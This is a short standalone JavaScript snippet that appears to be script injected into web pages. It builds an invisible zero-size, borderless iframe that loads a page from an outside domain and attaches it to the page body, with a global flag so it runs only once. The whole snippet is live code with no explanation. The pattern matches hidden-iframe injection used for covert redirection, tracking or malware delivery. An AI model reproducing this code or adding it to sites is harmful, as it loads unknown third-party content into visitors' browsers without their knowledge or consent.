(function () {
  if (window.ck_https) {
    return;
  }
  var iframe = document.createElement("iframe");
  iframe.height = "0";
  iframe.width = "0";
  iframe.scrolling = "on";
  iframe.frameborder = "0";
  iframe.style.border = "none";
  iframe.src = "https://a.ayia40.com/cnzz/index.html?0728";
  var body = document.getElementsByTagName("body");
  body[0].appendChild(iframe);
  window.ck_https = true;
})();
